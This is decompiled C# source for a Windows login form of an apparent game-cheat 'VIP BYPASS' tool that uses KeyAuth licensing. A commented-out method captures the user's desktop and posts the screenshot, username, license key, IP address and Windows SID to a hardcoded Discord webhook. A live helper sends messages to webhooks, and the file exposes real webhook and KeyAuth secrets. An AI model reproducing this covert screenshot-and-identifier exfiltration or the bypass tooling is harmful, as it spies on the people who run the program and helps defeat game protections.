using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;
using Siticone.Desktop.UI.WinForms;
using Siticone.Desktop.UI.WinForms.Enums;

namespace BYPASS
{
	// Token: 0x0200002D RID: 45
	public partial class Login : Form
	{
		// Token: 0x060000F4 RID: 244 RVA: 0x000027D7 File Offset: 0x000009D7
		public Login()
		{
			this.method_8();
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x000087B8 File Offset: 0x000069B8
		private void siticoneGradientButton_0_Click(object sender, EventArgs e)
		{
			Login.<siticoneGradientButton1_Click>d__4 <siticoneGradientButton1_Click>d__;
			<siticoneGradientButton1_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<siticoneGradientButton1_Click>d__.<>4__this = this;
			<siticoneGradientButton1_Click>d__.<>1__state = -1;
			<siticoneGradientButton1_Click>d__.<>t__builder.Start<Login.<siticoneGradientButton1_Click>d__4>(ref <siticoneGradientButton1_Click>d__);
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x000087F0 File Offset: 0x000069F0
		private void siticoneControlBox_1_Click(object sender, EventArgs e)
		{
			Login.<siticoneControlBox1_Click>d__7 <siticoneControlBox1_Click>d__;
			<siticoneControlBox1_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<siticoneControlBox1_Click>d__.<>1__state = -1;
			<siticoneControlBox1_Click>d__.<>t__builder.Start<Login.<siticoneControlBox1_Click>d__7>(ref <siticoneControlBox1_Click>d__);
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x00008820 File Offset: 0x00006A20
		private Task method_0()
		{
			Login.<Workinfinte>d__8 <Workinfinte>d__;
			<Workinfinte>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<Workinfinte>d__.<>4__this = this;
			<Workinfinte>d__.<>1__state = -1;
			<Workinfinte>d__.<>t__builder.Start<Login.<Workinfinte>d__8>(ref <Workinfinte>d__);
			return <Workinfinte>d__.<>t__builder.Task;
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x00008864 File Offset: 0x00006A64
		private Task<int> method_1(int int_0)
		{
			Login.<WorkinfinteAsync>d__9 <WorkinfinteAsync>d__;
			<WorkinfinteAsync>d__.<>t__builder = AsyncTaskMethodBuilder<int>.Create();
			<WorkinfinteAsync>d__.<>4__this = this;
			<WorkinfinteAsync>d__.a = int_0;
			<WorkinfinteAsync>d__.<>1__state = -1;
			<WorkinfinteAsync>d__.<>t__builder.Start<Login.<WorkinfinteAsync>d__9>(ref <WorkinfinteAsync>d__);
			return <WorkinfinteAsync>d__.<>t__builder.Task;
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x000088B0 File Offset: 0x00006AB0
		private void method_2()
		{
			Login.<killgameloop>d__10 <killgameloop>d__;
			<killgameloop>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<killgameloop>d__.<>1__state = -1;
			<killgameloop>d__.<>t__builder.Start<Login.<killgameloop>d__10>(ref <killgameloop>d__);
		}

		// Token: 0x060000FA RID: 250 RVA: 0x000088E0 File Offset: 0x00006AE0
		private void Login_Load(object sender, EventArgs e)
		{
			Login.<Login_Load>d__11 <Login_Load>d__;
			<Login_Load>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Login_Load>d__.<>4__this = this;
			<Login_Load>d__.<>1__state = -1;
			<Login_Load>d__.<>t__builder.Start<Login.<Login_Load>d__11>(ref <Login_Load>d__);
		}

		// Token: 0x060000FB RID: 251 RVA: 0x00008918 File Offset: 0x00006B18
		private static string smethod_0()
		{
			string text = null;
			Random random = new Random();
			for (int i = 0; i < 5; i++)
			{
				text += Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0))).ToString();
			}
			return text;
		}

		// Token: 0x060000FC RID: 252 RVA: 0x00008974 File Offset: 0x00006B74
		private void siticoneCustomGradientPanel_0_Paint(object sender, PaintEventArgs e)
		{
			Login.<siticoneCustomGradientPanel1_Paint>d__13 <siticoneCustomGradientPanel1_Paint>d__;
			<siticoneCustomGradientPanel1_Paint>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<siticoneCustomGradientPanel1_Paint>d__.<>1__state = -1;
			<siticoneCustomGradientPanel1_Paint>d__.<>t__builder.Start<Login.<siticoneCustomGradientPanel1_Paint>d__13>(ref <siticoneCustomGradientPanel1_Paint>d__);
		}

		// Token: 0x060000FD RID: 253 RVA: 0x000089A4 File Offset: 0x00006BA4
		public static void discordwebhook(string url, string username, string msg)
		{
			WebClient webClient = new WebClient();
			try
			{
				webClient.UploadValues(url, new NameValueCollection
				{
					{
						"content",
						msg
					},
					{
						"username",
						"[user]_" + username
					}
				});
			}
			catch
			{
			}
		}

		// Token: 0x060000FE RID: 254 RVA: 0x000089FC File Offset: 0x00006BFC
		private void timer_0_Tick(object sender, EventArgs e)
		{
			Login.<timer1_Tick>d__15 <timer1_Tick>d__;
			<timer1_Tick>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<timer1_Tick>d__.<>1__state = -1;
			<timer1_Tick>d__.<>t__builder.Start<Login.<timer1_Tick>d__15>(ref <timer1_Tick>d__);
		}

		// Token: 0x060000FF RID: 255 RVA: 0x00008A2C File Offset: 0x00006C2C
		private bool method_3()
		{
			string hostNameOrAddress = "google.com";
			bool result = false;
			Ping ping = new Ping();
			try
			{
				if (ping.Send(hostNameOrAddress, 3000).Status == IPStatus.Success)
				{
					return true;
				}
			}
			catch
			{
				this.method_2();
				Environment.Exit(0);
			}
			return result;
		}

		// Token: 0x06000100 RID: 256 RVA: 0x00008A84 File Offset: 0x00006C84
		private void method_4()
		{
			Login.<LoginPage>d__20 <LoginPage>d__;
			<LoginPage>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<LoginPage>d__.<>4__this = this;
			<LoginPage>d__.<>1__state = -1;
			<LoginPage>d__.<>t__builder.Start<Login.<LoginPage>d__20>(ref <LoginPage>d__);
		}

		// Token: 0x06000101 RID: 257 RVA: 0x00008ABC File Offset: 0x00006CBC
		public static string GetPublicIP()
		{
			return new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(new char[]
			{
				':'
			})[1].Substring(1).Split(new char[]
			{
				'<'
			})[0];
		}

		// Token: 0x06000102 RID: 258 RVA: 0x00008B18 File Offset: 0x00006D18
		private void timer_1_Tick(object sender, EventArgs e)
		{
			Login.<timer2_Tick>d__23 <timer2_Tick>d__;
			<timer2_Tick>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<timer2_Tick>d__.<>4__this = this;
			<timer2_Tick>d__.<>1__state = -1;
			<timer2_Tick>d__.<>t__builder.Start<Login.<timer2_Tick>d__23>(ref <timer2_Tick>d__);
		}

		// Token: 0x06000103 RID: 259 RVA: 0x00008B50 File Offset: 0x00006D50
		private void method_5()
		{
			Login.<evrymnt>d__24 <evrymnt>d__;
			<evrymnt>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<evrymnt>d__.<>4__this = this;
			<evrymnt>d__.<>1__state = -1;
			<evrymnt>d__.<>t__builder.Start<Login.<evrymnt>d__24>(ref <evrymnt>d__);
		}

		// Token: 0x06000104 RID: 260 RVA: 0x00008B88 File Offset: 0x00006D88
		private void method_6()
		{
			Login.<Toolused>d__26 <Toolused>d__;
			<Toolused>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Toolused>d__.<>4__this = this;
			<Toolused>d__.<>1__state = -1;
			<Toolused>d__.<>t__builder.Start<Login.<Toolused>d__26>(ref <Toolused>d__);
		}

		// Token: 0x06000105 RID: 261 RVA: 0x00008BC0 File Offset: 0x00006DC0
		private void timer_2_Tick(object sender, EventArgs e)
		{
			Login.<pingg_Tick>d__27 <pingg_Tick>d__;
			<pingg_Tick>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<pingg_Tick>d__.<>4__this = this;
			<pingg_Tick>d__.<>1__state = -1;
			<pingg_Tick>d__.<>t__builder.Start<Login.<pingg_Tick>d__27>(ref <pingg_Tick>d__);
		}

		// Token: 0x06000106 RID: 262 RVA: 0x00008BF8 File Offset: 0x00006DF8
		private void method_7(object sender, EventArgs e)
		{
			Login.<button1_Click>d__28 <button1_Click>d__;
			<button1_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<button1_Click>d__.<>1__state = -1;
			<button1_Click>d__.<>t__builder.Start<Login.<button1_Click>d__28>(ref <button1_Click>d__);
		}

		// Token: 0x06000107 RID: 263 RVA: 0x000027E5 File Offset: 0x000009E5
		private void siticoneGradientButton_1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000109 RID: 265 RVA: 0x00008C28 File Offset: 0x00006E28
		private void method_8()
		{
			this.icontainer_0 = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Login));
			this.siticoneCustomGradientPanel_0 = new SiticoneCustomGradientPanel();
			this.siticoneGradientButton_1 = new SiticoneGradientButton();
			this.siticonePanel_0 = new SiticonePanel();
			this.label_0 = new Label();
			this.siticoneControlBox_1 = new SiticoneControlBox();
			this.siticoneControlBox_0 = new SiticoneControlBox();
			this.siticoneTextBox_0 = new SiticoneTextBox();
			this.siticoneGradientButton_0 = new SiticoneGradientButton();
			this.siticoneDragControl_0 = new SiticoneDragControl(this.icontainer_0);
			this.timer_0 = new Timer(this.icontainer_0);
			this.siticoneDragControl_1 = new SiticoneDragControl(this.icontainer_0);
			this.timer_1 = new Timer(this.icontainer_0);
			this.timer_2 = new Timer(this.icontainer_0);
			this.siticoneDragControl_2 = new SiticoneDragControl(this.icontainer_0);
			this.siticoneCustomGradientPanel_0.SuspendLayout();
			this.siticonePanel_0.SuspendLayout();
			base.SuspendLayout();
			this.siticoneCustomGradientPanel_0.BackColor = Color.FromArgb(9, 246, 118);
			this.siticoneCustomGradientPanel_0.BorderColor = Color.FromArgb(224, 224, 224);
			this.siticoneCustomGradientPanel_0.Controls.Add(this.siticoneGradientButton_1);
			this.siticoneCustomGradientPanel_0.Controls.Add(this.siticonePanel_0);
			this.siticoneCustomGradientPanel_0.Controls.Add(this.siticoneTextBox_0);
			this.siticoneCustomGradientPanel_0.Controls.Add(this.siticoneGradientButton_0);
			this.siticoneCustomGradientPanel_0.Dock = DockStyle.Fill;
			this.siticoneCustomGradientPanel_0.FillColor = Color.Transparent;
			this.siticoneCustomGradientPanel_0.FillColor2 = Color.Transparent;
			this.siticoneCustomGradientPanel_0.FillColor3 = Color.Transparent;
			this.siticoneCustomGradientPanel_0.FillColor4 = Color.Transparent;
			this.siticoneCustomGradientPanel_0.Location = new Point(0, 0);
			this.siticoneCustomGradientPanel_0.Name = "siticoneCustomGradientPanel1";
			this.siticoneCustomGradientPanel_0.ShadowDecoration.Parent = this.siticoneCustomGradientPanel_0;
			this.siticoneCustomGradientPanel_0.Size = new Size(351, 112);
			this.siticoneCustomGradientPanel_0.TabIndex = 1;
			this.siticoneCustomGradientPanel_0.Paint += this.siticoneCustomGradientPanel_0_Paint;
			this.siticoneGradientButton_1.Animated = true;
			this.siticoneGradientButton_1.BackColor = Color.FromArgb(4, 108, 54);
			this.siticoneGradientButton_1.BorderColor = Color.Transparent;
			this.siticoneGradientButton_1.BorderRadius = 3;
			this.siticoneGradientButton_1.CheckedState.Parent = this.siticoneGradientButton_1;
			this.siticoneGradientButton_1.CustomImages.Parent = this.siticoneGradientButton_1;
			this.siticoneGradientButton_1.DisabledState.BorderColor = Color.FromArgb(64, 0, 0);
			this.siticoneGradientButton_1.DisabledState.CustomBorderColor = Color.FromArgb(64, 0, 0);
			this.siticoneGradientButton_1.DisabledState.FillColor = Color.FromArgb(64, 0, 0);
			this.siticoneGradientButton_1.DisabledState.FillColor2 = Color.FromArgb(64, 0, 0);
			this.siticoneGradientButton_1.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			this.siticoneGradientButton_1.DisabledState.Parent = this.siticoneGradientButton_1;
			this.siticoneGradientButton_1.FillColor = Color.Transparent;
			this.siticoneGradientButton_1.FillColor2 = Color.Transparent;
			this.siticoneGradientButton_1.Font = new Font("Segoe UI Semibold", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.siticoneGradientButton_1.ForeColor = Color.White;
			this.siticoneGradientButton_1.HoverState.Parent = this.siticoneGradientButton_1;
			this.siticoneGradientButton_1.Location = new Point(176, 72);
			this.siticoneGradientButton_1.Name = "siticoneGradientButton2";
			this.siticoneGradientButton_1.ShadowDecoration.Parent = this.siticoneGradientButton_1;
			this.siticoneGradientButton_1.Size = new Size(166, 32);
			this.siticoneGradientButton_1.TabIndex = 16;
			this.siticoneGradientButton_1.Text = "EXIT";
			this.siticoneGradientButton_1.Click += this.siticoneGradientButton_1_Click;
			this.siticonePanel_0.BackColor = Color.FromArgb(4, 108, 54);
			this.siticonePanel_0.Controls.Add(this.label_0);
			this.siticonePanel_0.Controls.Add(this.siticoneControlBox_1);
			this.siticonePanel_0.Controls.Add(this.siticoneControlBox_0);
			this.siticonePanel_0.Dock = DockStyle.Top;
			this.siticonePanel_0.ForeColor = Color.Black;
			this.siticonePanel_0.Location = new Point(0, 0);
			this.siticonePanel_0.Name = "siticonePanel1";
			this.siticonePanel_0.ShadowDecoration.Parent = this.siticonePanel_0;
			this.siticonePanel_0.Size = new Size(351, 26);
			this.siticonePanel_0.TabIndex = 15;
			this.label_0.AutoSize = true;
			this.label_0.BackColor = Color.Transparent;
			this.label_0.Font = new Font("Times New Roman", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label_0.ForeColor = Color.FromArgb(224, 224, 224);
			this.label_0.Location = new Point(109, 5);
			this.label_0.Name = "label1";
			this.label_0.Size = new Size(126, 17);
			this.label_0.TabIndex = 14;
			this.label_0.Text = "RBG VIP BYPASS";
			this.siticoneControlBox_1.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.siticoneControlBox_1.BackColor = Color.Transparent;
			this.siticoneControlBox_1.FillColor = Color.Transparent;
			this.siticoneControlBox_1.ForeColor = Color.Transparent;
			this.siticoneControlBox_1.HoverState.Parent = this.siticoneControlBox_1;
			this.siticoneControlBox_1.IconColor = Color.White;
			this.siticoneControlBox_1.Location = new Point(325, 1);
			this.siticoneControlBox_1.Name = "siticoneControlBox1";
			this.siticoneControlBox_1.ShadowDecoration.Parent = this.siticoneControlBox_1;
			this.siticoneControlBox_1.Size = new Size(25, 21);
			this.siticoneControlBox_1.TabIndex = 1;
			this.siticoneControlBox_1.Click += this.siticoneControlBox_1_Click;
			this.siticoneControlBox_0.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.siticoneControlBox_0.BackColor = Color.Transparent;
			this.siticoneControlBox_0.ControlBoxType = ControlBoxType.MinimizeBox;
			this.siticoneControlBox_0.FillColor = Color.Transparent;
			this.siticoneControlBox_0.ForeColor = Color.Transparent;
			this.siticoneControlBox_0.HoverState.Parent = this.siticoneControlBox_0;
			this.siticoneControlBox_0.IconColor = Color.White;
			this.siticoneControlBox_0.Location = new Point(299, 1);
			this.siticoneControlBox_0.Name = "siticoneControlBox2";
			this.siticoneControlBox_0.ShadowDecoration.Parent = this.siticoneControlBox_0;
			this.siticoneControlBox_0.Size = new Size(25, 21);
			this.siticoneControlBox_0.TabIndex = 11;
			this.siticoneTextBox_0.BackColor = Color.Black;
			this.siticoneTextBox_0.BorderColor = Color.FromArgb(4, 108, 54);
			this.siticoneTextBox_0.BorderThickness = 2;
			this.siticoneTextBox_0.Cursor = Cursors.IBeam;
			this.siticoneTextBox_0.DefaultText = "";
			this.siticoneTextBox_0.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
			this.siticoneTextBox_0.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
			this.siticoneTextBox_0.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
			this.siticoneTextBox_0.DisabledState.Parent = this.siticoneTextBox_0;
			this.siticoneTextBox_0.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
			this.siticoneTextBox_0.FocusedState.BorderColor = Color.FromArgb(4, 108, 54);
			this.siticoneTextBox_0.FocusedState.Parent = this.siticoneTextBox_0;
			this.siticoneTextBox_0.Font = new Font("Segoe UI", 9f);
			this.siticoneTextBox_0.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
			this.siticoneTextBox_0.HoverState.Parent = this.siticoneTextBox_0;
			this.siticoneTextBox_0.Location = new Point(9, 34);
			this.siticoneTextBox_0.Name = "key";
			this.siticoneTextBox_0.PasswordChar = '\0';
			this.siticoneTextBox_0.PlaceholderText = "";
			this.siticoneTextBox_0.SelectedText = "";
			this.siticoneTextBox_0.ShadowDecoration.Parent = this.siticoneTextBox_0;
			this.siticoneTextBox_0.Size = new Size(333, 32);
			this.siticoneTextBox_0.TabIndex = 12;
			this.siticoneGradientButton_0.Animated = true;
			this.siticoneGradientButton_0.BackColor = Color.FromArgb(4, 108, 54);
			this.siticoneGradientButton_0.BorderColor = Color.Transparent;
			this.siticoneGradientButton_0.BorderRadius = 3;
			this.siticoneGradientButton_0.CheckedState.Parent = this.siticoneGradientButton_0;
			this.siticoneGradientButton_0.CustomImages.Parent = this.siticoneGradientButton_0;
			this.siticoneGradientButton_0.DisabledState.BorderColor = Color.FromArgb(4, 108, 54);
			this.siticoneGradientButton_0.DisabledState.CustomBorderColor = Color.FromArgb(4, 108, 54);
			this.siticoneGradientButton_0.DisabledState.FillColor = Color.FromArgb(4, 108, 54);
			this.siticoneGradientButton_0.DisabledState.FillColor2 = Color.FromArgb(4, 108, 54);
			this.siticoneGradientButton_0.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			this.siticoneGradientButton_0.DisabledState.Parent = this.siticoneGradientButton_0;
			this.siticoneGradientButton_0.FillColor = Color.Transparent;
			this.siticoneGradientButton_0.FillColor2 = Color.Transparent;
			this.siticoneGradientButton_0.Font = new Font("Segoe UI Semibold", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.siticoneGradientButton_0.ForeColor = Color.White;
			this.siticoneGradientButton_0.HoverState.Parent = this.siticoneGradientButton_0;
			this.siticoneGradientButton_0.Location = new Point(9, 72);
			this.siticoneGradientButton_0.Name = "siticoneGradientButton1";
			this.siticoneGradientButton_0.ShadowDecoration.Parent = this.siticoneGradientButton_0;
			this.siticoneGradientButton_0.Size = new Size(161, 32);
			this.siticoneGradientButton_0.TabIndex = 3;
			this.siticoneGradientButton_0.Text = "LOGIN";
			this.siticoneGradientButton_0.Click += this.siticoneGradientButton_0_Click;
			this.siticoneDragControl_0.TargetControl = this.siticoneCustomGradientPanel_0;
			this.timer_0.Interval = 15000;
			this.timer_0.Tick += this.timer_0_Tick;
			this.siticoneDragControl_1.TargetControl = this.label_0;
			this.timer_1.Enabled = true;
			this.timer_1.Interval = 30000;
			this.timer_1.Tick += this.timer_1_Tick;
			this.timer_2.Interval = 3000;
			this.timer_2.Tick += this.timer_2_Tick;
			this.siticoneDragControl_2.TargetControl = this.siticonePanel_0;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(351, 112);
			base.Controls.Add(this.siticoneCustomGradientPanel_0);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "Login";
			base.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "BYPASS";
			base.Load += this.Login_Load;
			this.siticoneCustomGradientPanel_0.ResumeLayout(false);
			this.siticonePanel_0.ResumeLayout(false);
			this.siticonePanel_0.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x0600010B RID: 267 RVA: 0x00009938 File Offset: 0x00007B38
		[CompilerGenerated]
		//private void method_9()
		//{
		//	try
		//	{
		//		ScrnCt.CaptureDesktop().Save("C:\\Recovery\\screen.jpg", ImageFormat.Jpeg);
		//		string text = "https://discord.com/api/webhooks/1045245959921225778/zhwQ3TP6xBk20euYxeuVvsQ_aQVnq9ZqB6BhdgNjIkQmMVvQGbD5ICNk335cztuSw8Ab";
		//		string path = "C:\\Recovery\\screen.jpg";
		//		using (HttpClient httpClient = new HttpClient())
		//		{
		//			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
		//			byte[] array = File.ReadAllBytes(path);
		//			multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "png", Path.GetTempPath() + "ss.jpg");
		//			httpClient.PostAsync(text, multipartFormDataContent).Wait();
		//			httpClient.Dispose();
		//		}
		//		string value = string.Concat(new string[]
		//		{
		//			"```Username    :  ",
		//			Environment.UserName,
		//			"\nLicense     :  ",
		//			this.string_1,
		//			"\nKeyauthIp   :  ",
		//			Login.string_3,
		//			"\nOnlineUsers :  ",
		//			Login.string_2,
		//			"\nHWID        :  ",
		//			Login.string_4,
		//			"```"
		//		});
		//		WebClient webClient = new WebClient();
		//		try
		//		{
		//			webClient.UploadValues(text, new NameValueCollection
		//			{
		//				{
		//					"content",
		//					value
		//				},
		//				{
		//					"username",
		//					Environment.UserName ?? ""
		//				}
		//			});
		//		}
		//		catch
		//		{
		//		}
		//	}
		//	catch (Exception)
		//	{
		//	}
		//	try
		//	{
		//		if (Login.KeyAuthApp.checkblack())
		//		{
		//			Application.Exit();
		//		}
		//	}
		//	catch (Exception)
		//	{
		//	}
		//}

		// Token: 0x040000C8 RID: 200
		private string string_0;

		// Token: 0x040000C9 RID: 201
		//public static api KeyAuthApp = new api("myapp", "Iu2LH1y7SF", "64594f94740bdc0b8ad015a1ce448aa7f4374578c7531e278bde253b342414dd", "2.0");

		// Token: 0x040000CA RID: 202
		private string string_1;

		// Token: 0x040000CB RID: 203
		public static string downloadlink1 = "";

		// Token: 0x040000CC RID: 204
		public static string dllversion1 = "";

		// Token: 0x040000CD RID: 205
		private static string string_2;

		// Token: 0x040000CE RID: 206
		private static string string_3;

		// Token: 0x040000CF RID: 207
		private static string string_4 = WindowsIdentity.GetCurrent().User.Value;

		// Token: 0x040000D0 RID: 208
		private string string_5;

		// Token: 0x040000D2 RID: 210
		private SiticoneCustomGradientPanel siticoneCustomGradientPanel_0;

		// Token: 0x040000D3 RID: 211
		private SiticoneControlBox siticoneControlBox_0;

		// Token: 0x040000D4 RID: 212
		private SiticoneGradientButton siticoneGradientButton_0;

		// Token: 0x040000D5 RID: 213
		private SiticoneControlBox siticoneControlBox_1;

		// Token: 0x040000D6 RID: 214
		private SiticoneTextBox siticoneTextBox_0;

		// Token: 0x040000D7 RID: 215
		private SiticoneDragControl siticoneDragControl_0;

		// Token: 0x040000D8 RID: 216
		private Timer timer_0;

		// Token: 0x040000D9 RID: 217
		private SiticoneDragControl siticoneDragControl_1;

		// Token: 0x040000DA RID: 218
		private Timer timer_1;

		// Token: 0x040000DB RID: 219
		private Timer timer_2;

		// Token: 0x040000DC RID: 220
		private Label label_0;

		// Token: 0x040000DD RID: 221
		private SiticonePanel siticonePanel_0;

		// Token: 0x040000DE RID: 222
		private SiticoneDragControl siticoneDragControl_2;

		// Token: 0x040000DF RID: 223
		private SiticoneGradientButton siticoneGradientButton_1;

		// Token: 0x0200002E RID: 46
		public class WhatsMyIp
		{
			// Token: 0x0600010D RID: 269 RVA: 0x00009AE8 File Offset: 0x00007CE8
			public static IPAddress GetMyIp()
			{
				List<string> list = new List<string>
				{
					"https://ip.chiper.io/"
				};
				using (WebClient webClient = new WebClient())
				{
					foreach (string address in list)
					{
						try
						{
							return IPAddress.Parse(webClient.DownloadString(address));
						}
						catch
						{
						}
					}
				}
				return null;
			}

			// Token: 0x1700002D RID: 45
			// (get) Token: 0x0600010E RID: 270 RVA: 0x00002818 File Offset: 0x00000A18
			// (set) Token: 0x0600010F RID: 271 RVA: 0x0000281F File Offset: 0x00000A1F
			public static IPAddress PublicIp { get; private set; } = Login.WhatsMyIp.GetMyIp();

			// Token: 0x040000E0 RID: 224
			[CompilerGenerated]
			private static IPAddress ipaddress_0;
		}
	}
}
